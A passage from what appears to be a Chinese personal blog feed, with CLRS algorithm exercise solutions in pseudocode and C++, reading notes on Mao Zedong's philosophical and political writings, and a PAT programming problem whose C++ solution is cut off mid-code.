<p>许多有用的算法在结构上是递归的：为了解决一个给定的问题，算法一次或多次递归地调用其自身以解决紧密相关的若干子问题。这些算法典型地遵循分治法的思想：将原问题分解为几个规模较小但类似于原问题的子问题，递归地求解这些子问题，然后再合并这些子问题的解来建立原问题的解。</p>
</blockquote>
<p><strong>2.3-1</strong>    Using Figure 2.4 as a model, illustrate the operation of merge sort on the array A=⟨3,41,52,26,38,57,9,49⟩.</p>
<p><img src="/images/sfdl-2.3-1.png" alt="Alt text"></p>
<p><strong>2.3-2</strong>    Rewrite the MERGE procedure so that it does not use sentinels, instead stopping once either array L or R has had all its elements copied back to A and then copying the remainder of the other array back into A.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">MERGE(A, p, q, r)</span><br><span class="line">  n1 = q - p + <span class="number">1</span></span><br><span class="line">  n2 = r - q</span><br><span class="line">  let L[<span class="number">1.</span>.n₁] and R[<span class="number">1.</span>.n₂] be <span class="keyword">new</span> arrays</span><br><span class="line">  <span class="keyword">for</span> i = <span class="number">1</span> to n₁</span><br><span class="line">      L[i] = A[p + i - <span class="number">1</span>]</span><br><span class="line">  <span class="keyword">for</span> j = <span class="number">1</span> to n₂</span><br><span class="line">      R[j] = A[q + j]</span><br><span class="line">  i = <span class="number">1</span></span><br><span class="line">  j = <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> k = p to r</span><br><span class="line">      <span class="keyword">if</span> i &gt; n1</span><br><span class="line">          A[k] = R[j]</span><br><span class="line">          j = j + <span class="number">1</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> j &gt; n2</span><br><span class="line">          A[k] = L[i]</span><br><span class="line">          i = i + <span class="number">1</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> L[i] ≤ R[j]</span><br><span class="line">          A[k] = L[i]</span><br><span class="line">          i = i + <span class="number">1</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">          A[k] = R[j]</span><br><span class="line">          j = j + <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><strong>2.3-3</strong>    Use mathematical induction to show that when n is an exact power of 2, the solution of the recurrence</p>
<p>$\begin{equation}T(n)= \begin{cases} 2&amp; \text{n=2}\ 2T(n/2)+n&amp; \text{n=$2^k,k&gt;1$} \end{cases} \end{equation}$</p>
<p>证明：</p>
<blockquote>
<p>$F(k)=T(2^k)$<br>$F(k)=2^klg2^k$<br>$F(1)=T(2)=2=2lg2=2^1lg2^1$<br>$F(k+1)=T(2^{k+1})=2T({2k+1\over2})+2^{k+1}=2T(2^k)+2^{k+1}=2⋅2^klg2^k+2^{k+1}=2^{k+1}(lg2^k+1)=2^{k+1}(lg2^k+lg2)=2^{k+1}lg2^{k+1}$</p>
</blockquote>
<p><strong>2.3-5</strong>    Referring back to the searching problem (see Exercise 2.1-3), observe that if the sequence A is sorted, we can check the midpoint of the sequence against ν and eliminate half of the sequence from further consideration. The binary search algorithm repeats this procedure, halving the size of the remaining portion of the sequence each time. Write pseudocode, either iterative or recursive, for binary search. Argue that the worst-case running time of binary search is Θ(lgn).</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">BINARY-SEARCH(A, v):</span><br><span class="line">  low = <span class="number">1</span></span><br><span class="line">  high = A.length</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> low &lt;= high</span><br><span class="line">      mid = (low + high) / <span class="number">2</span></span><br><span class="line">      <span class="keyword">if</span> A[mid] == v</span><br><span class="line">          <span class="keyword">return</span> mid</span><br><span class="line">      <span class="keyword">if</span> A[mid] &lt; v</span><br><span class="line">          low = mid + <span class="number">1</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">          high = mid - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> NIL</span><br></pre></td></tr></table></figure>
<p><strong>2.3-6</strong>    Observe that the while loop line 5-7 of the INSERTION-SORT procedure in Section 2.1 uses a linear search to scan (backward) through the sorted subarray A[i..j−1]. Can we use a binary search (see Exercise 2.3-5) instead to improve the overall worst-case running time of insertion sort to Θ(nlgn)?</p>
<p>答：不行，因为不仅仅需要找到合适位置，还涉及顺序后移较大的元素。二分法只能找到合适位置，但是插入仍需要移位。</p>
<p><strong>2.3-7</strong>    ★ Describe a Θ(nlgn)-time algorithm that, given a set S of n integers and another integer x, determines whether or not there exists two elements of S whose sum is exactly x.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">PAIR-EXISTS(S, x):</span><br><span class="line">  A = MERGE-SORT(S)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i = <span class="number">1</span> to S.length</span><br><span class="line">      <span class="keyword">if</span> BINARY-SEARCH(A, x - S[i]) != NIL</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
        <category>算法导论</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>算法导论</tag>
      </tags>
  </entry>
  <entry>
    <title>算法导论-第一章</title>
    <url>/2019/12/01/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0/</url>
    <content><![CDATA[<h2 id="第一章-算法在计算中的作用"><a href="#第一章-算法在计算中的作用" class="headerlink" title="第一章    算法在计算中的作用"></a>第一章    算法在计算中的作用</h2><p><strong>算法</strong>，应该注意它广义的定义，<code>不正确的算法只要其错误率可控有时可能是有用的</code>。</p>
<p><strong>数据结构</strong>，没有单一的数据结构对所有用途均有效，所以重要的是知道几种数据结构的<code>优势和局限</code>。</p>
<p><strong>1.2-2</strong>    假设我们正在比较插入排序与归并排序在相同机器上的实现。对规模为n的输入，插入排序运行$8{n^2}$步，而归并排序运行$64n\log_2n$步。问对那些n值，插入排序优于归并排序？</p>
<a id="more"></a>
<blockquote>
<p>$8{n^2} &lt; 64n\log_2n$<br>$n &lt; 8\log_2n$<br>$n &lt; \log_2{n^8}$<br>$2^n &lt; {n^8}$</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">pow</span>(<span class="number">2.0</span>, (<span class="keyword">double</span>)n) &lt; <span class="built_in">pow</span>((<span class="keyword">double</span>)n, <span class="number">8.0</span>))&#123;</span><br><span class="line">		n++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d"</span>,n<span class="number">-1</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得出n从2开始，到44为止（不含44）。所以结果是$2≤n≤43$。</p>
<p><strong>1.2-3</strong>    n的最小值为何值时，运行时间为$100n^2$的一个算法在相同机器上快于运行时间为$2^n$的另一个算法？</p>
<blockquote>
<p>$100n^2 &lt; 2^n$</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">100.0</span> * <span class="built_in">pow</span>((<span class="keyword">double</span>)n,<span class="number">2.0</span>) &gt; <span class="built_in">pow</span>(<span class="number">2.0</span>, (<span class="keyword">double</span>)n))&#123;</span><br><span class="line">		n++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d"</span>, n);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当<code>n = 14</code>时，则$100n^2$ 第一次快于 $2^n$。</p>
<p><strong>思考题1-1</strong>    （运行时间的比较）假设求解问题的算法需要$f(n)$毫秒（原书是微秒microseconds），对下表中的每个函数$f(n)$和时间t，确定可以在时间t内求解的问题的最大规模n。</p>
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:center">1 second</th>
<th style="text-align:center">1 minute</th>
<th style="text-align:center">1 hour</th>
<th style="text-align:center">1 day</th>
<th style="text-align:center">1 month</th>
<th style="text-align:center">1 year</th>
<th style="text-align:center">1 century</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">$lgn$</td>
<td style="text-align:center">$2^{10^6}$</td>
<td style="text-align:center">$2^{6× 10^7}$</td>
<td style="text-align:center">$2^{3.6 × 10^9}$</td>
<td style="text-align:center">$2^{8.64 × 10^{10}}$</td>
<td style="text-align:center">$2^{2.592 × 10^{12}}$</td>
<td style="text-align:center">$2^{3.1536 × 10^{13}}$</td>
<td style="text-align:center">$2^{3.1536 × 10^{15}}$</td>
</tr>
<tr>
<td style="text-align:center">$\sqrt{n}$</td>
<td style="text-align:center">$10^{12}$</td>
<td style="text-align:center">$3.6 × 10^{15}$</td>
<td style="text-align:center">$1.296 ×10^{19}$</td>
<td style="text-align:center">$7.465 × 10^{21}$</td>
<td style="text-align:center">$6.718 × 10^{24}$</td>
<td style="text-align:center">$9.945 × 10^{26}$</td>
<td style="text-align:center">$9.945 × 10^{30}$</td>
</tr>
<tr>
<td style="text-align:center">$n$</td>
<td style="text-align:center">$10^6$</td>
<td style="text-align:center">$6 × 10^7$</td>
<td style="text-align:center">$3.6 × 10^9$</td>
<td style="text-align:center">$8.64 × 10^{10}$</td>
<td style="text-align:center">$2.592 × 10^{12}$</td>
<td style="text-align:center">$3.1536 × 10^{13}$</td>
<td style="text-align:center">$3.1536 × 10^{15}$</td>
</tr>
<tr>
<td style="text-align:center">$nlgn$</td>
<td style="text-align:center">$62746$</td>
<td style="text-align:center">$2.8 × 10^6$</td>
<td style="text-align:center">$1.3 × 10^8$</td>
<td style="text-align:center">$2.7 × 10^9$</td>
<td style="text-align:center">$7.1 × 10^{10}$</td>
<td style="text-align:center">$7.9 × 10^{11}$</td>
<td style="text-align:center">$6.8 × 10^{13}$</td>
</tr>
<tr>
<td style="text-align:center">$n^2$</td>
<td style="text-align:center">$10^3$</td>
<td style="text-align:center">$7745$</td>
<td style="text-align:center">$60000$</td>
<td style="text-align:center">$293938$</td>
<td style="text-align:center">$1609968$</td>
<td style="text-align:center">$5615692$</td>
<td style="text-align:center">$56175382$</td>
</tr>
<tr>
<td style="text-align:center">$n^3$</td>
<td style="text-align:center">$10^2$</td>
<td style="text-align:center">$391$</td>
<td style="text-align:center">$1532$</td>
<td style="text-align:center">$4420$</td>
<td style="text-align:center">$13736$</td>
<td style="text-align:center">$31593$</td>
<td style="text-align:center">$146677$</td>
</tr>
<tr>
<td style="text-align:center">$2^n$</td>
<td style="text-align:center">$19$</td>
<td style="text-align:center">$25$</td>
<td style="text-align:center">$31$</td>
<td style="text-align:center">$36$</td>
<td style="text-align:center">$41$</td>
<td style="text-align:center">$44$</td>
<td style="text-align:center">$51$</td>
</tr>
<tr>
<td style="text-align:center">$n!$</td>
<td style="text-align:center">$9$</td>
<td style="text-align:center">$11$</td>
<td style="text-align:center">$12$</td>
<td style="text-align:center">$13$</td>
<td style="text-align:center">$15$</td>
<td style="text-align:center">$16$</td>
<td style="text-align:center">$17$</td>
</tr>
</tbody>
</table>
<blockquote>
<p>$1s=10^6us$<br>$1min=6 × 10^7us$<br>$1h=3.6 × 10^9us$<br>$1D=8.64 × 10^{10}us$<br>$1Mon=2.592 × 10^{12}us$ （1个月30天）<br>$1Y=3.1536 × 10^{13}us$ （365天）<br>$1C=3.1536 × 10^{15}us$</p>
<p>这里给出第一列的计算过程：<br>$lgn = 1s = 10^6us$    ==&gt;    $n = 2^{10^6}$<br>$\sqrt{n} = 1s = 10^6us$    ==&gt;    $n = {10^6}^2 = 10^{12}$<br>$n = 1s = 10^6us$<br>$nlgn = 1s = 10^6us$    ==&gt;    $n = 62746$（可以通过编程来计算）<br>$n^2 = 1s = 10^6us$    ==&gt;    $n = 10^3$<br>$n^3 = 1s = 10^6us$    ==&gt;    $n = 10^2$<br>$2^n = 1s = 10^6us$    ==&gt;    $n = 19$<br>$n! = 1s = 10^6us$    ==&gt;    $n = 9$（可以通过编程来计算）</p>
</blockquote>
]]></content>
      <categories>
        <category>算法</category>
        <category>算法导论</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>算法导论</tag>
      </tags>
  </entry>
  <entry>
    <title>《矛盾论》笔记</title>
    <url>/2019/01/04/%E3%80%8A%E7%9F%9B%E7%9B%BE%E8%AE%BA%E3%80%8B%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>世界是怎样存在的？</p>
<ul>
<li><p>形而上学或庸俗进化论：孤立，静止，片面，无矛盾的的观点。</p>
</li>
<li><p>辩证法：联系，全面，发展，矛盾的观点。</p>
</li>
</ul>
<a id="more"></a>
<p>事物发展的根本原因，在于事物内部的矛盾性，外因通过内因起作用，内因和外因的辩证关系：</p>
<ul>
<li>事物的内部矛盾是事物的内因，事物的外部矛盾是事物发展的外因。</li>
<li>关系：对立统一</li>
<li>相互区别：内因即内部矛盾是事物存在的基础，是事物发展的根本原因。外因是事物变化的条件，它能够加速或延缓甚至暂时改变事物发展的进程，是事物发展的第二位原因。例如：鸡蛋经过适当的温度变为小鸡，但温度不能使石头变为小鸡，其中根本在于事物的内因是不同的。</li>
<li>相互联系：外因必须通过内因而起作用，两者共同推动事物的发展。例如：我党在早期出现的机会主义，和在反围剿时期出现的冒险主义，以致最后失败。都是由于我党内部原因是根本原因，当清算了这些错误，我们就又发展了。由此看来，一个政党要引导革命到胜利，必须依靠自己政治路线的正确和组织上的巩固。</li>
<li>事物的发展是由内因决定的，并受外因影响。</li>
</ul>
<p>矛盾的普遍性：</p>
]]></content>
      <categories>
        <category>哲学</category>
        <category>毛泽东思想</category>
      </categories>
      <tags>
        <tag>毛泽东思想</tag>
        <tag>哲学</tag>
      </tags>
  </entry>
  <entry>
    <title>《实践论》笔记</title>
    <url>/2019/01/02/%E3%80%8A%E5%AE%9E%E8%B7%B5%E8%AE%BA%E3%80%8B%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<ul>
<li><p>实践的三种形式：</p>
<ul>
<li>人类的生产活动（劳动实践）是最基本的实践，通过劳动，我们可以了解自然的规律和属性，人与自然的关系等；进而也可以了解人与人之间的关系。</li>
<li>人的社会政治实践，比如：政治生活，阶级斗争等。</li>
<li><p>科学文化实践，不论是从对于社会历史发展的全面了解，还是对于其他科学领域的实践探索，也都是实践。</p>
  <a id="more"></a>
</li>
</ul>
</li>
</ul>
<ul>
<li>实践决定认识，通过实践检验认识，或者纠正认识；同时认识反作用于实践，对实践进行指导。实践先于并且高于认识，并且最终实践与认识会相统一。<code>实践是检验真理的唯一标准</code>，这是真理的本性和实践的特点决定的：<ul>
<li>真理的本性是<code>主客观相统一</code>。</li>
<li>实践的本性是直接现实性。</li>
</ul>
</li>
</ul>
<ul>
<li>认识的两个阶段：<ul>
<li>感性认识，是人在是实践中感官对事物的形态的直接，具体的反映。包含感知，直觉，表象三种形式。它具有直接性和具体性。</li>
<li>理性认识，是认识的高级阶段，是人通过思维对事物内部联系的间接，概括的反映。它包括概念，判断，推理，以及假说和理论等形式。它具有间接性和抽象性。</li>
<li>辩证关系：<code>理性认识依赖于感性认识，感性认识有待于发展成理性认知</code>。</li>
</ul>
</li>
</ul>
<ul>
<li>认识的两次飞跃：<ul>
<li>第一次是从感性认识到理性认识，两者具有辩证关系。夸大感性，导致经验主义（读书无用论）；夸大理性，导致教条主义（死读书，唯理论）。</li>
<li>第二次是从理性认识回到实践：从实践的角度看，<code>只有回到实践才能指导实践</code>；从认识的角度看，<code>只有回到实践才能检验认识</code>。</li>
</ul>
</li>
</ul>
<ul>
<li>感觉到的东西，我们不能立刻理解它，只有理解的东西才能深刻地感觉它。感觉只解决现象问题，理论才解决本质问题。</li>
</ul>
<ul>
<li>实践需要<code>诚实和谦逊</code>的态度，这点虽然不是理论点，但实践中我们经常犯眼高手低的错误。<code>虚心使人进步，骄傲使人落后</code>。</li>
</ul>
<ul>
<li>认识的规律：<ul>
<li>认识具有<code>反复性</code>，人对于一个复杂事物的认识，往往要经过由感性认识到理性认识，再由理性认识到实践的多次反复才能完成。</li>
<li>认识具有<code>无限性</code>：人的认识是无止境的，它表现为“实践，认识，再实践，再认识”的无限循环，但这种循环不是原地打转，而是循环往复，螺旋上升的。</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>哲学</category>
        <category>毛泽东思想</category>
      </categories>
      <tags>
        <tag>毛泽东思想</tag>
        <tag>哲学</tag>
      </tags>
  </entry>
  <entry>
    <title>毛泽东选集第一卷笔记</title>
    <url>/2019/01/01/%E6%AF%9B%E6%B3%BD%E4%B8%9C%E9%80%89%E9%9B%86%E7%AC%AC%E4%B8%80%E5%8D%B7%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<ul>
<li><p>《中国社会各阶级的分析》：分析了中国社会各阶级的组成，指出了革命斗争的敌人和朋友。指导我们，做事情先要调查和思考，不能盲目，要团结真正的朋友，以攻击真正的敌人。</p>
  <a id="more"></a>
</li>
<li><p>《湖南农民运动考察报告》：没有调查权就没有发言权，通过对当地经济，政治切身实地的考察，农民革命的发展和农会的发展。提出了两点：</p>
<ul>
<li>封建社会中国人民所受的四种权力的支配：政权，族权，神权，夫权（女性）。</li>
<li>矫枉必须过正，不过正不能矫枉。</li>
</ul>
</li>
</ul>
<ul>
<li><p>《中国的红色革命为什么能够存在》：由于反革命势力的不统一及其之间的斗争，使得红色政权可以存在，坚持斗争。</p>
</li>
<li><p>《井冈山的斗争》：分析了先前失败的斗争原因，其一个重要问题，是拿不住中间阶级。</p>
</li>
<li><p>《关于纠正党内的错误思想》：党指导军的思想。并分析了一些错误的思想，对主观主义，盲动主义，绝对平均主义，个人主义提出了批评和纠正指导。符合唯物辩证主义的思想，注意理论和实践的结合，拒绝倒向两个极端。</p>
</li>
<li><p>《星星之火可以燎原》：从战略角度上考虑了当前的形势，教育我们不能悲观，要认清事实的本质；另一方面，从战术的角度，指出了游击战术与集中兵力需要适时分析与使用；最后，通过既有分析，掷地有声地指出了”星星之火可以燎原“，提升了信心。</p>
</li>
<li><p>《必须注意经济工作》：指出了战时经济的重要性，从现实指出了经济的重要性，经济建设是战争胜利的保证，呼应了《孙子兵法》的对于战争日费千金的警示，同时给出了具体的经济建设的一些指导意见；对于工农，政检，文教三方面要重视，要相互促进，辩证统一。</p>
</li>
<li><p>《怎样分析农村阶级》：对于阶级进行划分，分地主，富农，中农，贫农，工人五个阶级。</p>
</li>
<li><p>《我们的经济政策》：坚持经济建设，坚持斗争；并指出了当前的国民经济由：国营，合作社，私营三方面组成。</p>
</li>
<li><p>《关心群众生活，注意工作方法》：指出了群众的重要性，同时要想发动群众，就要走到群众中去，为群众服务；同时不能光说不做，要研究如何去做，要注意工作方法。</p>
</li>
<li><p>《论反对日本帝国主义的策略》：分析了当前的形式，中国仍是半殖民地半封建的社会，民族资产阶级是中间派，他们是可以联合的，而非完全敌对的，同时，说明了长征并不只是一次转移，期间做的一些工作和后面对于长征的评价，将是有益于革命的；确立了建立统一战线，反对关门主义，指出了革命道路上应该辩证思考问题，避免扯向两个极端；指出当前革命任务仍是反帝反封建的资产阶级的民主革命；指出了国际援助的必要性。</p>
</li>
<li><p>《中国革命战争的战略问题》：</p>
<ul>
<li>第一章    如何研究战争：定义了战争，是矛盾的最高斗争形势，战争（矛盾）具有普遍性和特殊性；要用发展的眼光看问题，要注重自身实践，并联系理论，在实践中检验理论；战略和战术的关系，也即是全局和局部的关系，要抓住主要矛盾，照顾好全局，使得局部与全局相统一；指出了学习的重要性，要善于在实践中学习，实践与理论具有客观和主观的矛盾关系，要解决好主客观间的矛盾关系，要辩证的取舍的学习，取其精华去其糟粕。</li>
<li>第二章    中国共产党和中国革命战争：指出了革命道路上是曲折的，前途是光明的。</li>
<li>第三章    中国革命战争的特点：指出了革命战争的四条特点，辩证地指出了革命的前途光明，但是道路是曲折的；提出了战略上应该持久战，战术上应该速决战等论点。</li>
<li>第四章    围剿和反围剿–中国内战的主要形式：通过国民党和中国共产党的五次围剿和反围剿，引出了防御和进攻的概念，为后面解释整体的战略做引导。</li>
<li>第五章    战略防御：进攻具有连续性；不打无准备的仗，准备条件从政治，军事，财政，社会舆论等方面入手；解释了以弱胜强的一个方法–以退为进（战略退却），并用《曹刿论战》做了历史案例，强调后发制人，在当前不能与敌抗衡时，用空间换取时间，为胜利赢取条件，另外，也指出了退却的时机尽量过早，绝不可过晚，过迟的损失比过早的大；指出了，一旦条件成熟，应该及时出手，并捡弱的打，否则，宁可等待也绝不出手，一旦出手将是第一战，指出了初战的重要性，初战是全盘战役的序幕，此时心中应该已有全局的计划，最后，应该留有后手，做最坏的打算；集中兵力的问题，强调了“伤其十指不如断其一指”的战术，只有集中兵力才能重创敌人，另强调了获取主动权的重要意义，一旦被动将被环境支配，陷于应付主义，最终失败；提出了“战略上以一当十，战术上以十当一”的理念，也顺应了“战略上藐视敌人，战术上重视敌人”，提出了战术上还是应该运动战和速决战，而战略上应是持久战。</li>
</ul>
</li>
</ul>
<ul>
<li><p>《关于蒋介石声明的声明》：西安事变的评论。</p>
</li>
<li><p>《中国共产党在抗日时期的任务》：讲了同一民族战线的建立，回顾了历史上的国共合作，确立了关键点是要掌握主动权，不能失去独立自主的原则，失掉了自主将失去党的生命。</p>
</li>
<li><p>《实践论》：见文章实践论笔记。</p>
</li>
<li>《矛盾论》：见文章矛盾论笔记。</li>
</ul>
]]></content>
      <categories>
        <category>哲学</category>
        <category>毛泽东思想</category>
      </categories>
      <tags>
        <tag>毛泽东思想</tag>
        <tag>哲学</tag>
      </tags>
  </entry>
  <entry>
    <title>PAT B1014-福尔摩斯的约会 (20分)</title>
    <url>/2018/02/05/PAT-B1014-%E7%A6%8F%E5%B0%94%E6%91%A9%E6%96%AF%E7%9A%84%E7%BA%A6%E4%BC%9A-20%E5%88%86/</url>
    <content><![CDATA[<p>大侦探福尔摩斯接到一张奇怪的字条：<code>我们约会吧！ 3485djDkxh4hhGE 2984akDfkkkkggEdsb s&amp;hgsfdk d&amp;Hyscvnm</code>。大侦探很快就明白了，字条上奇怪的乱码实际上就是约会的时间<code>星期四 14:04</code>，因为前面两字符串中第 1 对相同的大写英文字母（大小写有区分）是第 4 个字母 <code>D</code>，代表星期四；第 2 对相同的字符是 <code>E</code> ，那是第 5 个英文字母，代表一天里的第 14 个钟头（于是一天的 0 点到 23 点由数字 0 到 9、以及大写字母 <code>A</code> 到 <code>N</code> 表示）；后面两字符串第 1 对相同的英文字母 <code>s</code> 出现在第 4 个位置（从 0 开始计数）上，代表第 4 分钟。现给定两对字符串，请帮助福尔摩斯解码得到约会的时间。</p>
<a id="more"></a>
<p><strong>输入格式：</strong></p>
<p>输入在 4 行中分别给出 4 个非空、不包含空格、且长度不超过 60 的字符串。</p>
<p><strong>输出格式：</strong><br>在一行中输出约会的时间，格式为 <code>DAY HH:MM</code>，其中 <code>DAY</code> 是某星期的 3 字符缩写，即 <code>MON</code> 表示星期一，<code>TUE</code> 表示星期二，<code>WED</code> 表示星期三，<code>THU</code> 表示星期四，<code>FRI</code> 表示星期五，<code>SAT</code> 表示星期六，<code>SUN</code> 表示星期日。题目输入保证每个测试存在唯一解。</p>
<p><strong>输入样例：</strong></p>
<pre><code>3485djDkxh4hhGE

2984akDfkkkkggEdsb

s&amp;hgsfdk

d&amp;Hyscvnm
</code></pre><p><strong>输出样例：</strong></p>
<pre><code>THU 14:04
</code></pre><h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><p>星期，小时和分钟都是<strong>有界限的</strong>，需要进行边界判断。星期是A-G大写字母，小时是：0-9、A-N大写字母，分钟是：0-60数字。对这些字母处理的同时需要做好边界检测。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app=PAT-Basic lang=c++</span></span><br><span class="line"><span class="comment"> * https://pintia.cn/problem-sets/994805260223102976/problems/994805308755394560</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="built_in">string</span> week[<span class="number">7</span>] = &#123;<span class="string">"MON"</span>,<span class="string">"TUE"</span>,<span class="string">"WED"</span>,<span class="string">"THU"</span>,<span class="string">"FRI"</span>,<span class="string">"SAT"</span>,<span class="string">"SUN"</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isUpperLetter</span><span class="params">(<span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c &gt;= <span class="string">'A'</span> &amp;&amp; c &lt;= <span class="string">'Z'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isWeek</span><span class="params">(<span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> isUpperLetter(c) &amp;&amp; (c &lt; <span class="string">'H'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isHour</span><span class="params">(<span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> isUpperLetter(c) &amp;&amp; (c &lt; <span class="string">'O'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isNum</span><span class="params">(<span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c &gt;= <span class="string">'0'</span> &amp;&amp; c &lt;= <span class="string">'9'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isSameLetter</span><span class="params">(<span class="keyword">char</span> a,<span class="keyword">char</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a != b)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> (a &gt;= <span class="string">'a'</span>&amp;&amp; a &lt;= <span class="string">'z'</span>) || (a &gt;= <span class="string">'A'</span>&amp;&amp; a &lt;= <span class="string">'Z'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> s1, s2, s3, s4;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; s1 &gt;&gt; s2 &gt;&gt; s3 &gt;&gt; s4;</span><br><span class="line">    <span class="keyword">int</span> minLen1 = s1.length() &lt; s2.length() ? s1.length() : s2.length();</span><br><span class="line">    <span class="keyword">int</span> minLen2 = s3.length() &lt; s4.length() ? s3.length() : s4.length();</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; minLen1; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (s1[i] == s2[i] &amp;&amp; isWeek(s1[i]))&#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; week[s1[i]-<span class="string">'A'</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = i+<span class="number">1</span>; i &lt; minLen1;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (s1[i] == s2[i])&#123;</span><br><span class="line">            <span class="keyword">if</span> (isHour(s1[i]))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">" %02d"</span>,<span class="number">10</span>+s1[i]-<span class="string">'A'</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (isNum(s1[i]))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">" %02d"</span>, s1[i] - <span class="string">'0'</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">61</span>;j++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (isSameLetter(s3[j], s4[j])&amp;&amp;j &lt; <span class="number">61</span>)&#123;</span><br><span class="line">            <span 